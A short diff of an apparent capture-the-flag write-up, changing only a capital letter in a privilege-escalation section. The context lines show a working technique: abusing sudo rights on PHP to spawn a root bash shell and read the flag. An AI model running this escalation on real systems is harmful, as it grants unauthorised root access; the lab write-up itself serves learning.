@@ -51,7 +51,7 @@
 		  
 ## Privilege Escelation
 - `sudo -l`
-	* alice has root access on /usr/bin/php
+	* Alice has root access on /usr/bin/php
 - `sudo php -r 'shell_exec("sudo /bin/bash -i 1>&0");'`
 - Root access granted
 - `cd /root && cat flag*` and capture the **second flag**
